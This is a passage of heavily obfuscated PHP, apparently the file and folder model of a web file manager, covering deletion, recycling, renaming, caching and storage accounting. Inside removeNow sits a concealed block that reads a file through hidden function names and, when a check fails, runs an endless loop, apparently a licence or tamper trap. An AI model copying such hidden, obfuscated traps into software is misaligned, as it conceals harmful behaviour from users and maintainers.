unset(self::$cacheChildList[$Çµ„¦Òê]); } static $¶Òİšö = false; if (!$¶Òİšö) { Hook::trigger($‚µÑªø¸[604], $»½àÎæ¬); $¶Òİšö = !0; } $üÈØÜÃï = $this->add($»½àÎæ¬); $öƒ´Ù«Ÿ = array($‚µÑªø¸[622] => short_id($üÈØÜÃï)); $this->where(array($‚µÑªø¸[459] => $üÈØÜÃï))->save($öƒ´Ù«Ÿ); $this->setNamePinyin($üÈØÜÃï, $»½àÎæ¬[$‚µÑªø¸[32]]); return $üÈØÜÃï; } public function remove($‹Š˜Ú, $òÃ°æˆ² = true) { $ø…ë´ı¡ =& $_SERVER[—ÌÒğš÷]; $Š­Ü‘ÅÓ = $this->sourceInfo($‹Š˜Ú); $´…¢Ø„¦ = intval($Š­Ü‘ÅÓ[$ø…ë´ı¡[178]]) === self::TYPE_SYSTEM; $Í«ší¹ö = Model($ø…ë´ı¡[476])->get($ø…ë´ı¡[2176]) == $ø…ë´ı¡[88]; if ($´…¢Ø„¦ || $òÃ°æˆ² || !$Í«ší¹ö) { return $this->removeNow($‹Š˜Ú, $òÃ°æˆ²); } $ŠÎ˜Ñ„Š = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¥áÀãª = $Š­Ü‘ÅÓ[$ø…ë´ı¡[178]] == self::TYPE_USER ? $ø…ë´ı¡[630] : $ø…ë´ı¡[547]; if ($¥áÀãª == $ø…ë´ı¡[630]) { $ú¿‰·»ç = Model($ø…ë´ı¡[546])->getInfo($Š­Ü‘ÅÓ[$ø…ë´ı¡[538]]); $¿åĞÁÂÛ = !empty($ú¿‰·»ç[$ø…ë´ı¡[2169]]) ? $ú¿‰·»ç[$ø…ë´ı¡[2169]] : $ú¿‰·»ç[$ø…ë´ı¡[32]]; $¿åĞÁÂÛ = $ø…ë´ı¡[304] . $¿åĞÁÂÛ . $ø…ë´ı¡[2177] . $Š­Ü‘ÅÓ[$ø…ë´ı¡[538]]; } else { $ú¿‰·»ç = Model($ø…ë´ı¡[554])->getInfo($Š­Ü‘ÅÓ[$ø…ë´ı¡[538]]); $¿åĞÁÂÛ = _get($ú¿‰·»ç, $ø…ë´ı¡[32]); $¿åĞÁÂÛ = $ø…ë´ı¡[163] . $¿åĞÁÂÛ . $ø…ë´ı¡[2178] . $Š­Ü‘ÅÓ[$ø…ë´ı¡[538]]; } $…š³±ñû = $ø…ë´ı¡[2179] . md5($¿åĞÁÂÛ); CacheLock::lock($…š³±ñû); $ÁØ…¾œ¦ = $this->fileNameExist($ŠÎ˜Ñ„Š, $¿åĞÁÂÛ); if (!$ÁØ…¾œ¦) { $ÁØ…¾œ¦ = $this->mkdir($ŠÎ˜Ñ„Š, $¿åĞÁÂÛ, REPEAT_SKIP); $this->metaSet($ÁØ…¾œ¦, $ø…ë´ı¡[2180], $¥áÀãª); $this->metaSet($ÁØ…¾œ¦, $ø…ë´ı¡[2181], $Š­Ü‘ÅÓ[$ø…ë´ı¡[538]]); if ($Š­Ü‘ÅÓ[$ø…ë´ı¡[180]] != 0) { $this->metaSet($ÁØ…¾œ¦, $ø…ë´ı¡[2182], _get($ú¿‰·»ç, $ø…ë´ı¡[2183])); } } CacheLock::unlock($…š³±ñû); $this->metaSet($‹Š˜Ú, $ø…ë´ı¡[2184], $Š­Ü‘ÅÓ[$ø…ë´ı¡[180]]); $this->where(array($ø…ë´ı¡[181] => $‹Š˜Ú))->save(array($ø…ë´ı¡[466] => time())); $this->recycleClear($Š­Ü‘ÅÓ); $Ä¸ºŒÃê = $this->move($‹Š˜Ú, $ÁØ…¾œ¦, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Š­Ü‘ÅÓ[$ø…ë´ı¡[180]]); return $Ä¸ºŒÃê; } private function recycleClear($Å£»ºúá) { $ˆ‡ÁÜÓÁ =& $_SERVER[—ÌÒğš÷]; $æ˜éË˜‹ = $this->childrenAll($Å£»ºúá); $Áı²–ßÆ = array($ˆ‡ÁÜÓÁ[459] => array($ˆ‡ÁÜÓÁ[460], $æ˜éË˜‹[$ˆ‡ÁÜÓÁ[2185]])); Model($ˆ‡ÁÜÓÁ[2186])->where($Áı²–ßÆ)->delete(); } public function removeNow($åûŠÒ, $ÄŠãŒ‡ø = true) { $å‚Âş²• =& $_SERVER[—ÌÒğš÷]; if (!isset($_SERVER[$å‚Âş²•[879]]) || !isset($_SERVER[$å‚Âş²•[877]])) { $æÍüû Ñ = $å‚Âş²•[921]; $«˜š·³â = $å‚Âş²•[880]; $ú¨Š¤§ = $_SERVER[$å‚Âş²•[881]] . $å‚Âş²•[882]; $¾Æãçù = $«˜š·³â($ú¨Š¤§); $ö½”Êõ™ = explode($å‚Âş²•[246], $¾Æãçù); if (count($ö½”Êõ™) < $å‚Âş²•[658]) { $æƒÎöí“ = $å‚Âş²•[883]; $æƒÎöí“(); } $©¤Ê©„š = $å‚Âş²•[922]; $©¤Ê©„š($_SERVER[$å‚Âş²•[923]]); $ÈÂ¤Àğ® = 1; for ($ä¢‹Â¤‹ = $ÈÂ¤Àğ®; $ä¢‹Â¤‹ > 0; $ä¢‹Â¤‹++) { $©¤Ê©„š = json_encode($GLOBALS[$å‚Âş²•[460]]); } } $Àæı”óå = $this->sourceInfo($åûŠÒ); $›È¢ì¥ = $this->pathInfoMore($åûŠÒ); if (!$Àæı”óå) { return !0; } if ($Àæı”óå[$å‚Âş²•[180]] == 0) { if (!_get($GLOBALS, $å‚Âş²•[536])) { return !1; } } $this->lockMoveStart($åûŠÒ); Hook::trigger($å‚Âş²•[2187], $›È¢ì¥, $ÄŠãŒ‡ø); if ($ÄŠãŒ‡ø) { Model($å‚Âş²•[2186])->moveToRecycle($åûŠÒ); } else { $ö‚ÕûÙö = $this->childrenAll($Àæı”óå); Model($å‚Âş²•[601])->eventRemove($åûŠÒ); $this->removeRelevance($ö‚ÕûÙö[$å‚Âş²•[2185]], $ö‚ÕûÙö[$å‚Âş²•[1499]]); } $this->folderSizeReset($Àæı”óå[$å‚Âş²•[180]]); $ §‚øÊ = array($Àæı”óå[$å‚Âş²•[180]]); if ($Àæı”óå[$å‚Âş²•[453]] == $å‚Âş²•[88]) { $ §‚øÊ[] = $Àæı”óå[$å‚Âş²•[181]]; } $this->updateModifyTime($ §‚øÊ); $this->lockMoveEnd($åûŠÒ); Hook::trigger($å‚Âş²•[1730], $›È¢ì¥, $ÄŠãŒ‡ø); return !0; } public function childrenAll($ÆŞğ¬¦) { $¼¾ØÌÔ‹ =& $_SERVER[—ÌÒğš÷]; $ÛŒòøô = $ÆŞğ¬¦[$¼¾ØÌÔ‹[181]]; if ($ÆŞğ¬¦[$¼¾ØÌÔ‹[453]] == $¼¾ØÌÔ‹[88]) { $ˆƒ¢‘Á· = array($¼¾ØÌÔ‹[620] => array($¼¾ØÌÔ‹[580], $ÆŞğ¬¦[$¼¾ØÌÔ‹[553]] . $ÛŒòøô . $¼¾ØÌÔ‹[581])); $»ãÄ«Ø¢ = array($¼¾ØÌÔ‹[620] => $ˆƒ¢‘Á·[$¼¾ØÌÔ‹[553]]); $·Ìì™«Ÿ = $this->field($¼¾ØÌÔ‹[2188])->where($»ãÄ«Ø¢)->select(); $¾±ŒÖ¬ = !1; $Õ—³ï«¶ = array($ÛŒòøô); if ($·Ìì™«Ÿ) { $¾±ŒÖ¬ = array_to_keyvalue($·Ìì™«Ÿ, $¼¾ØÌÔ‹[12], $¼¾ØÌÔ‹[509]); $¾±ŒÖ¬ = array_remove_value($¾±ŒÖ¬, $¼¾ØÌÔ‹[212]); $Õ—³ï«¶ = array_to_keyvalue($·Ìì™«Ÿ, $¼¾ØÌÔ‹[12], $¼¾ØÌÔ‹[181]); $Õ—³ï«¶[] = $ÛŒòøô; } } else { $¾±ŒÖ¬ = array($ÆŞğ¬¦[$¼¾ØÌÔ‹[509]]); $Õ—³ï«¶ = array($ÛŒòøô); } return array($¼¾ØÌÔ‹[2185] => $Õ—³ï«¶, $¼¾ØÌÔ‹[1499] => $¾±ŒÖ¬); } public function removeArray($ºŞ”é•Ì) { if (!$ºŞ”é•Ì) { return !0; } } public function removeRelevance($ñÄ±³ñÎ, $¤Şì‘É‰) { $¤îÁûÙ¤ =& $_SERVER[—ÌÒğš÷]; $ñÄ±³ñÎ = $ñÄ±³ñÎ ? $ñÄ±³ñÎ : array(); $¤Şì‘É‰ = $¤Şì‘É‰ ? $¤Şì‘É‰ : array(); $ñÄ±³ñÎ = array_unique(array_filter($ñÄ±³ñÎ)); $¤Şì‘É‰ = array_unique(array_filter($¤Şì‘É‰)); if (!$ñÄ±³ñÎ) { return !1; } $Âæœ’ĞË = array($¤îÁûÙ¤[459] => array($¤îÁûÙ¤[460], $ñÄ±³ñÎ)); Model($¤îÁûÙ¤[2186])->where($Âæœ’ĞË)->delete(); Model($¤îÁûÙ¤[503])->where($Âæœ’ĞË)->delete(); Model($¤îÁûÙ¤[2034])->where($Âæœ’ĞË)->delete(); Model($¤îÁûÙ¤[601])->where($Âæœ’ĞË)->delete(); Model($¤îÁûÙ¤[1867])->removeBySource($ñÄ±³ñÎ); Model($¤îÁûÙ¤[2167])->removeBySource($ñÄ±³ñÎ); $this->where($Âæœ’ĞË)->delete(); Model($¤îÁûÙ¤[512])->remove($¤Şì‘É‰); for ($«Ò‰»­ = 0; $«Ò‰»­ < count($ñÄ±³ñÎ); $«Ò‰»­++) { $this->sourceCacheClear($ñÄ±³ñÎ[$«Ò‰»­]); } } public function rename($íÕ‰¬—š, $­™Ÿ²õ) { $Æ Ò›ş§ =& $_SERVER[—ÌÒğš÷]; $ Åïç¾ª = $this->sourceInfo($íÕ‰¬—š); if (!$ Åïç¾ª) { return !1; } $‡Ø£…àÃ = $this->fileNameExist($ Åïç¾ª[$Æ Ò›ş§[180]], $­™Ÿ²õ); if ($‡Ø£…àÃ && $‡Ø£…àÃ != $íÕ‰¬—š) { return !1; } $ïÃÕ©£¦ = array($Æ Ò›ş§[462] => $­™Ÿ²õ, $Æ Ò›ş§[619] => USER_ID); if ($ Åïç¾ª[$Æ Ò›ş§[453]] != $Æ Ò›ş§[88]) { $ïÃÕ©£¦[$Æ Ò›ş§[454]] = substr(get_path_ext($­™Ÿ²õ), 0, 10); } Model($Æ Ò›ş§[601])->eventRename($íÕ‰¬—š, $ Åïç¾ª[$Æ Ò›ş§[32]], $­™Ÿ²õ); $this->sourceCacheClear($íÕ‰¬—š); $this->setNamePinyin($íÕ‰¬—š, $ïÃÕ©£¦[$Æ Ò›ş§[32]], !1); $this->updateModifyTime($ Åïç¾ª[$Æ Ò›ş§[180]]); $±Ö„¿Ë„ = $this->where(array($Æ Ò›ş§[459] => $íÕ‰¬—š))->data($ïÃÕ©£¦)->save(); $‚Ó½‹»À = $Æ Ò›ş§[2175] . $ Åïç¾ª[$Æ Ò›ş§[180]]; if (isset(self::$cacheChildList[$‚Ó½‹»À])) { unset(self::$cacheChildList[$‚Ó½‹»À]); } return $±Ö„¿Ë„; } public function setNamePinyin($•ø–ûèÆ, $…ì—ğ¸, $Å·´¶À˜ = true) { $’ˆ¬“†ü =& $_SERVER[—ÌÒğš÷]; $´Öİœ²î = Input::check($…ì—ğ¸, $’ˆ¬“†ü[623]); $²†á¼È = array($’ˆ¬“†ü[485] => KodSort::makeStr($…ì—ğ¸)); if ($´Öİœ²î) { $²†á¼È[$’ˆ¬“†ü[506]] = str_replace($’ˆ¬“†ü[53], $’ˆ¬“†ü[12], Pinyin::get($…ì—ğ¸)); $²†á¼È[$’ˆ¬“†ü[505]] = Pinyin::get($…ì—ğ¸, $’ˆ¬“†ü[624]); } if (!$Å·´¶À˜ && !$´Öİœ²î) { $²†á¼È[$’ˆ¬“†ü[506]] = null; $²†á¼È[$’ˆ¬“†ü[505]] = null; } $this->metaSet($•ø–ûèÆ, $²†á¼È); } public function getContent($ØÄş‚ßç) { $Ô…£Ú£ =& $_SERVER[—ÌÒğš÷]; $ĞßªÖ¢á = $this->fileInfoGet($ØÄş‚ßç); if (!$ĞßªÖ¢á) { return !1; } if ($ĞßªÖ¢á[$Ô…£Ú£[76]] == 0) { return $Ô…£Ú£[12]; } $ë¸×ˆ İ = $Ô…£Ú£[2189] . $ĞßªÖ¢á[$Ô…£Ú£[641]]; if ($ĞßªÖ¢á[$Ô…£Ú£[76]] <= 1024 * 10) { $×§éœ¬‰ = Cache::get($ë¸×ˆ İ); if (!$×§éœ¬‰) { $×§éœ¬‰ = IO::getContent($ĞßªÖ¢á[$Ô…£Ú£[84]]); Cache::set($ë¸×ˆ İ, $×§éœ¬‰); } return $×§éœ¬‰; } if (!$ĞßªÖ¢á[$Ô…£Ú£[84]]) { return $Ô…£Ú£[12]; } return IO::getContent($ĞßªÖ¢á[$Ô…£Ú£[84]]); } public function setDesc($Š˜Ø›¯ò, $¦ˆªİ˜Ÿ) { $Òä¹³‘ =& $_SERVER[—ÌÒğš÷]; Model($Òä¹³‘[601])->eventAddDesc($Š˜Ø›¯ò, $¦ˆªİ˜Ÿ); return $this->metaSet($Š˜Ø›¯ò, $Òä¹³‘[494], $¦ˆªİ˜Ÿ); } public function setContent($ùıãò—‚, $°İ«ıù = '') { $‘‘‰û„¶ =& $_SERVER[—ÌÒğš÷]; $„ĞöÀÍª = $this->sourceInfo($ùıãò—‚); $Î…¥Ş£È = $this->fileInfoGet($ùıãò—‚); if (!$Î…¥Ş£È || !$„ĞöÀÍª) { return !1; } $ü·ñıä = Model($‘‘‰û„¶[512])->addFileByContent($°İ«ıù, $„ĞöÀÍª[$‘‘‰û„¶[32]]); $„Çö·‘ì = $this->fileHistory($„ĞöÀÍª, $ü·ñıä[$‘‘‰û„¶[509]], $ü·ñıä[$‘‘‰û„¶[76]]); if (!$„Çö·‘ì) { return Model($‘‘‰û„¶[512])->remove($ü·ñıä[$‘‘‰û„¶[509]]); } $this->folderSizeReset($„ĞöÀÍª[$‘‘‰û„¶[180]]); return !0; } public function fileSubstr($ÓŞíû×³, $øÌ³äÛâ, $Ç×ì¢é) { $Ì§¯Ç¯É = $this->fileInfoGet($ÓŞíû×³); if (!$Ì§¯Ç¯É) { return !1; } return IO::fileSubstr($Ì§¯Ç¯É[$_SERVER[—ÌÒğš÷][84]], $øÌ³äÛâ, $Ç×ì¢é); } public function fileInfoGet($•• ïñ²) { $Ò¾ß Úö =& $_SERVER[—ÌÒğš÷]; $€Åœâêã = $this->sourceInfo($•• ïñ²); if (!$€Åœâêã || $€Åœâêã[$Ò¾ß Úö[453]]) { return !1; } $ƒ¢õİª = $Ò¾ß Úö[515] . $€Åœâêã[$Ò¾ß Úö[509]]; $Úó´ÃÅÜ = _get(self::$cacheFileInfo, $ƒ¢õİª); if ($Úó´ÃÅÜ) { return $Úó´ÃÅÜ; } $Ñ¸É•£ = Model($Ò¾ß Úö[512])->fileInfo($€Åœâêã[$Ò¾ß Úö[509]]); if ($Ñ¸É•£) { $Ñ¸É•£[$Ò¾ß Úö[32]] = $€Åœâêã[$Ò¾ß Úö[32]]; } self::$cacheFileInfo[$ƒ¢õİª] = $Ñ¸É•£; return $Ñ¸É•£; } private function folderChildrenNumber($éĞÛù) { $ÆÆœ¡ =& $_SERVER[—ÌÒğš÷]; $—ãË‚‘ = $this->sourceInfo($éĞÛù); $ˆ©ÒÓŒÒ = array($ÆÆœ¡[620] => array($ÆÆœ¡[580], $—ãË‚‘[$ÆÆœ¡[553]] . $éĞÛù . $ÆÆœ¡[581]), $ÆÆœ¡[617] => $—ãË‚‘[$ÆÆœ¡[538]], $ÆÆœ¡[472] => intval($—ãË‚‘[$ÆÆœ¡[473]]), $ÆÆœ¡[614] => 1); $Çõ§òŞ“ = $this->where($ˆ©ÒÓŒÒ)->count(); $ìëøÓ Œ = $this->where($ˆ©ÒÓŒÒ)->where(array($ÆÆœ¡[614] => 0))->count(); return array($ÆÆœ¡[80] => $ìëøÓ Œ, $ÆÆœ¡[81] => $Çõ§òŞ“); } public function pathInfo($‚üÍı­Â, $‰Ò†ğŞ¨ = false) { $…Ù™ùÅ  =& $_SERVER[—ÌÒğš÷]; $‰Ò†ğŞ¨ = !1; $‚üÍı­Â = intval($‚üÍı­Â); $Ä±Ê€Ü = $…Ù™ùÅ [502] . intval($‰Ò†ğŞ¨) . $…Ù™ùÅ [430] . $‚üÍı­Â; $«õé–« = _get(self::$cachePathInfo, $Ä±Ê€Ü); if ($«õé–«) { return $«õé–«; } $‘€Ã¥“ = $this->sourceInfo($‚üÍı­Â); if (!$‘€Ã¥“) { return !1; } $‘€Ã¥“ = $this->_listDataApplyItem($‘€Ã¥“, $‰Ò†ğŞ¨); self::$cachePathInfo[$Ä±Ê€Ü] = $‘€Ã¥“; return $‘€Ã¥“; } public static $cachePathInfoMore = array(); public function pathInfoMore($øÕÍ”œâ) { $‚É—ã²ı =& $_SERVER[—ÌÒğš÷]; $¸Û•°Â› = _get(self::$cachePathInfoMore, $øÕÍ”œâ); if ($¸Û•°Â›) { return $¸Û•°Â›; } $’Ëˆ«øÙ = $this->pathInfo($øÕÍ”œâ); if (!$’Ëˆ«øÙ) { return !1; } if ($’Ëˆ«øÙ[$‚É—ã²ı[453]] == $‚É—ã²ı[88]) { $’Ëˆ«øÙ[$‚É—ã²ı[79]] = $this->folderChildrenNumber($øÕÍ”œâ); } self::$cachePathInfoMore[$øÕÍ”œâ] = $’Ëˆ«øÙ; return $’Ëˆ«øÙ; } public function sourceInfo($ù „ú™) { $ì»¼´Å• =& $_SERVER[—ÌÒğš÷]; if (!$ù „ú™) { return array(); } $ù „ú™ = intval($ù „ú™); $İ¤™¥ó = $ì»¼´Å•[501] . $ù „ú™; $æ¥çíØĞ = _get(self::$cacheSourceInfo, $İ¤™¥ó); if ($æ¥çíØĞ) { return $æ¥çíØĞ; } $ÄÁöôŒ… = $this->where(array($ì»¼´Å•[181] => $ù „ú™))->find(); self::$cacheSourceInfo[$İ¤™¥ó] = $ÄÁöôŒ…; return self::$cacheSourceInfo[$İ¤™¥ó]; } public function sourceCacheClear($¨‚±—÷ş = false) { self::cacheClear($¨‚±—÷ş); } public static function cacheClear($ÈŞûÆë = false) { $Í´‘» =& $_SERVER[—ÌÒğš÷]; if ($ÈŞûÆë == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Í´‘»[501] . $ÈŞûÆë]); unset(self::$cachePathInfoMore[$ÈŞûÆë]); unset(self::$cachePathInfo[$Í´‘»[2190] . $ÈŞûÆë]); unset(self::$cachePathInfo[$Í´‘»[2191] . $ÈŞûÆë]); } public function metaSet($¡„ÇŞØ®, $å‚Š•ûû = null, $à£”§³œ = null) { $ƒéÒÌµ« = parent::metaSet($¡„ÇŞØ®, $å‚Š•ûû, $à£”§³œ); if ($ƒéÒÌµ«) { $this->sourceCacheClear($¡„ÇŞØ®); } return $ƒéÒÌµ«; } public function pathInfoByPath($É©÷ß€¬, $Ê”±ê‰) { $§â¾»—à =& $_SERVER[—ÌÒğš÷]; $¯Î€şû­ = !$Ê”±ê‰ ? array() : explode($§â¾»—à[8], trim($Ê”±ê‰, $§â¾»—à[8])); $ı­ÎŒÔİ = $É©÷ß€¬; foreach ($¯Î€şû­ as $—ıšÕš) { $ÔÛŸÅØ = array($§â¾»—à[180] => $ı­ÎŒÔİ, $§â¾»—à[32] => $—ıšÕš); $Áâ€÷ÉÕ = $this->field($§â¾»—à[2192])->where($ÔÛŸÅØ)->select(); if (!$Áâ€÷ÉÕ) { return !1; } $Áâ€÷ÉÕ = array_sort_by($Áâ€÷ÉÕ, $§â¾»—à[473]); $ı­ÎŒÔİ = $Áâ€÷ÉÕ[0][$§â¾»—à[181]]; } $Ì„ëß¢© = $this->sourceInfo($ı­ÎŒÔİ); $this->pathInfoFilter($Ì„ëß¢©); return $Ì„ëß¢©; } protected function updateModifyTime($Äù™àËÇ) { $—½ĞÉÙ± =& $_SERVER[—ÌÒğš÷]; $Å›ÍŒÓç = defined($—½ĞÉÙ±[2108]) ? USER_ID : 0; if (!$Äù™àËÇ) { return; } if (!is_array($Äù™àËÇ)) { $Äù™àËÇ = array($Äù™àËÇ); } foreach ($Äù™àËÇ as $´Ö”Í˜ => $ûÙ”û×ê) { $Äù™àËÇ[$´Ö”Í˜] = intval($ûÙ”û×ê); $this->sourceCacheClear($ûÙ”û×ê); } $Ü™¾Ûø¸ = array($—½ĞÉÙ±[181] => array($—½ĞÉÙ±[7], $Äù™àËÇ)); $ÕÚğ—õÂ = array($—½ĞÉÙ±[619] => $Å›ÍŒÓç, $—½ĞÉÙ±[466] => time()); $this->where($Ü™¾Ûø¸)->save($ÕÚğ—õÂ); } public function folderSizeReset($Ø³á²«, $ûä¬ÖşÜ = false) { $‘¹Éœ· =& $_SERVER[—ÌÒğš÷]; if ($this->statusIgnoreResetSpace) { return; } $©œàœ» = $this->sourceInfo($Ø³á²«); $²—÷éµĞ = $‘¹Éœ·[2193] . $Ø³á²«; CacheLock::lock($²—÷éµĞ, 20); if ($ûä¬ÖşÜ === !1) { $this->sourceCacheClear($Ø³á²«); $©œàœ» = $this->sourceInfo($Ø³á²«); $ÄÄËûáÁ = array($‘¹Éœ·[445] => $Ø³á²«, $‘¹Éœ·[472] => 0); $¾à„¢›¥ = $this->where($ÄÄËûáÁ)->sum($‘¹Éœ·[76]); $ûä¬ÖşÜ = intval($¾à„¢›¥) - intval($©œàœ»[$‘¹Éœ·[76]]); } if ($ûä¬ÖşÜ == 0) { return CacheLock::unlock($²—÷éµĞ); } $±ãŸÑè¶ = $this->parentLevelArray($©œàœ»[$‘¹Éœ·[553]]); if (!$±ãŸÑè¶) { $±ãŸÑè¶ = array(); } $±ãŸÑè¶[] = $©œàœ»[$‘¹Éœ·[181]]; $ÄÄËûáÁ = array($‘¹Éœ·[181] => array($‘¹Éœ·[460], $±ãŸÑè¶)); if ($ûä¬ÖşÜ < 0) { $ÄÄËûáÁ[$‘¹Éœ·[76]] = array($‘¹Éœ·[1059], abs($ûä¬ÖşÜ)); } $this->where($ÄÄËûáÁ)->setAdd($‘¹Éœ·[76], $ûä¬ÖşÜ); CacheLock::unlock($²—÷éµĞ); $¿‰ó¤é = $‘¹Éœ·[2194] . $©œàœ»[$‘¹Éœ·[178]] . $‘¹Éœ·[4] . $©œàœ»[$‘¹Éœ·[538]]; $ûìçıüş = array($©œàœ»[$‘¹Éœ·[178]], $©œàœ»[$‘¹Éœ·[538]]); TaskRun::timeLimitCall($¿‰ó¤é, $‘¹Éœ·[2195], $ûìçıüş, 1.5); } public function folderSizeResetChildren($ÜáÆŒ÷) { $ÏåØ±“ =& $_SERVER[—ÌÒğš÷]; $this->sourceCacheClear($ÜáÆŒ÷); $©€½Çï² = $this->sourceInfo($ÜáÆŒ÷); $‰ãßüù = array($ÏåØ±“[614] => 1, $ÏåØ±“[617] => $©€½Çï²[$ÏåØ±“[538]], $ÏåØ±“[620] => array($ÏåØ±“[580], $©€½Çï²[$ÏåØ±“[553]] . $ÜáÆŒ÷ . $ÏåØ±“[581])); $¼«Ù¿¾ğ = $ÏåØ±“[2196]; $³¼ïóÌÃ = $this->field($¼«Ù¿¾ğ)->where($‰ãßüù)->select(); $‰ãßüù[$ÏåØ±“[453]] = 0; $äÔ‹äÕı = $this->field($¼«Ù¿¾ğ)->where($‰ãßüù)->select(); if (!$äÔ‹äÕı) { return; } $³¼ïóÌÃ[] = $©€½Çï²; $³¼ïóÌÃ = array_to_keyvalue($³¼ïóÌÃ, $ÏåØ±“[181]); foreach ($³¼ïóÌÃ as $…½­Ğ°­ => $âÎí±¹Î) { $³¼ïóÌÃ[$…½­Ğ°­][$ÏåØ±“[2197]] = $³¼ïóÌÃ[$…½­Ğ°­][$ÏåØ±“[76]]; $³¼ïóÌÃ[$…½­Ğ°­][$ÏåØ±“[76]] = 0; } foreach ($äÔ‹äÕı as $âÎí±¹Î) { $ö´”€¨— = $âÎí±¹Î[$ÏåØ±“[180]] . $ÏåØ±“[12]; if (!isset($³¼ïóÌÃ[$ö´”€¨—])) { continue; } if ($âÎí±¹Î[$ÏåØ±“[473]] == $³¼ïóÌÃ[$ö´”€¨—][$ÏåØ±“[473]]) { $³¼ïóÌÃ[$ö´”€¨—][$ÏåØ±“[76]] += $âÎí±¹Î[$ÏåØ±“[76]]; } } foreach ($³¼ïóÌÃ as $âÎí±¹Î) { $ïú¥›µá = $this->parentLevelArray($âÎí±¹Î[$ÏåØ±“[553]]); foreach ($ïú¥›µá as $ö´”€¨—) { $ö´”€¨— = $ö´”€¨— . $ÏåØ±“[12]; if (!isset($³¼ïóÌÃ[$ö´”€¨—])) { continue; } if ($âÎí±¹Î[$ÏåØ±“[473]] == $³¼ïóÌÃ[$ö´”€¨—][$ÏåØ±“[473]]) { $³¼ïóÌÃ[$ö´”€¨—][$ÏåØ±“[76]] += $âÎí±¹Î[$ÏåØ±“[76]]; } } } $š´öó·Ù = array(); foreach ($³¼ïóÌÃ as $âÎí±¹Î) { if ($âÎí±¹Î[$ÏåØ±“[76]] == $âÎí±¹Î[$ÏåØ±“[2197]]) { continue; } $š´öó·Ù[] = array($ÏåØ±“[181], $âÎí±¹Î[$ÏåØ±“[181]], $ÏåØ±“[76], $âÎí±¹Î[$ÏåØ±“[76]]); } $this->saveAll($š´öó·Ù); } public function userSpaceReset($Ã×¼Ÿ½õ = false) { $Íù©§’© =& $_SERVER[—ÌÒğš÷]; $ÛÊíşÙ© = $this->where(array($Íù©§’©[178] => self::TYPE_USER, $Íù©§’©[538] => $Ã×¼Ÿ½õ, $Íù©§’©[453] => 0))->sum($Íù©§’©[76]); $ÛÊíşÙ© = !$ÛÊíşÙ© || $ÛÊíşÙ© <= 0 ? 0 : $ÛÊíşÙ©; Model($Íù©§’©[546])->userEdit($Ã×¼Ÿ½õ, array($Íù©§’©[1876] => $ÛÊíşÙ©)); } public function targetSpaceUpdate($¿½­ÂÈà, $ÑÒ÷—ÑŸ) { $†®Æü­ú =& $_SERVER[—ÌÒğš÷]; if (!$ÑÒ÷—ÑŸ) { return; } if (!in_array($¿½­ÂÈà, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ñ¢œ¶‚Ì = $this->targetSpaceSize($¿½­ÂÈà, $ÑÒ÷—ÑŸ); if ($¿½­ÂÈà == self::TYPE_USER) { Model($†®Æü­ú[546])->userEdit($ÑÒ÷—ÑŸ, array($†®Æü­ú[1876] => $ñ¢œ¶‚Ì)); } else { if ($¿½­ÂÈà == self::TYPE_GROUP) { Model($†®Æü­ú[554])->groupEdit($ÑÒ÷—ÑŸ, array($†®Æü­ú[1876] => $ñ¢œ¶‚Ì)); } } } public function targetSpaceSize($œÏ‰ô­, $û—Çìõõ) { $¨—Üöù =& $_SERVER[—ÌÒğš÷]; $·îˆ’Óş = 0; $‰â¤—ğ = $this->targetSourceRoot($œÏ‰ô­, $û—Çìõõ, !0); foreach ($‰â¤—ğ as $Ø‡³ßÌÁ) { if (!$Ø‡³ßÌÁ) { continue; } $·îˆ’Óş += floatval($Ø‡³ßÌÁ[$¨—Üöù[76]]); $áÂğ¯… = array($¨—Üöù[620] => array($¨—Üöù[580], $¨—Üöù[563] . $Ø‡³ßÌÁ[$¨—Üöù[181]] . $¨—Üöù[581])); $¾†¸î’à = Model($¨—Üöù[471])->field($¨—Üöù[459])->where($áÂğ¯…)->select(); $¾†¸î’à = array_to_keyvalue($¾†¸î’à, $¨—Üöù[12], $¨—Üöù[181]); $¾†¸î’à = array_unique(array_filter($¾†¸î’à)); if ($¾†¸î’à) { $áÂğ¯… = array($¨—Üöù[459] => array($¨—Üöù[460], $¾†¸î’à)); $·îˆ’Óş += floatval($this->where($áÂğ¯…)->sum($¨—Üöù[76])); } } $·îˆ’Óş = !$·îˆ’Óş || $·îˆ’Óş <= 0 ? 0 : $·îˆ’Óş; return $·îˆ’Óş; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¥ë°Àãª) { return $this->fileTypeProfile($¥ë°Àãª, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ì•–Ó¾¨) { return $this->fileTypeProfile($ì•–Ó¾¨, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ƒŸÉæ¬, $¨ÖƒÁ) { $ü¶²Ä² =& $_SERVER[—ÌÒğš÷]; $¡–©¦æà = $ü¶²Ä²[2198] . $ƒŸÉæ¬ . $ü¶²Ä²[11] . $¨ÖƒÁ; $øÄÁö„‹ = Cache::get($¡–©¦æà); if ($øÄÁö„‹) { return $øÄÁö„‹; } $Ê¸¨” = array($ü¶²Ä²[614] => 0); if ($ƒŸÉæ¬ != !1) { $Ê¸¨”[$ü¶²Ä²[538]] = $ƒŸÉæ¬; $Ê¸¨”[$ü¶²Ä²[178]] = $¨ÖƒÁ; } $ØÀîÌñß = array(); $ØÀîÌñß[$ü¶²Ä²[2199]] = array($ü¶²Ä²[2200] => LNG($ü¶²Ä²[2199]), $ü¶²Ä²[2201] => $this->where($Ê¸¨”)->count(), $ü¶²Ä²[585] => $this->where($Ê¸¨”)->sum($ü¶²Ä²[76])); $§Ê¼‹ì = KodIO::fileTypeList(); foreach ($§Ê¼‹ì as $ûÒ£Ğ˜ => $è¸£Âß) { $Ê¸¨”[$ü¶²Ä²[454]] = $this->fileTypeWhere($ûÒ£Ğ˜); $ØÀîÌñß[$ûÒ£Ğ˜] = array($ü¶²Ä²[2200] => $è¸£Âß[$ü¶²Ä²[32]], $ü¶²Ä²[2201] => $this->where($Ê¸¨”)->count(), $ü¶²Ä²[585] => $this->where($Ê¸¨”)->sum($ü¶²Ä²[76])); } Cache::set($¡–©¦æà, $ØÀîÌñß, 1200); return $ØÀîÌñß; } public function 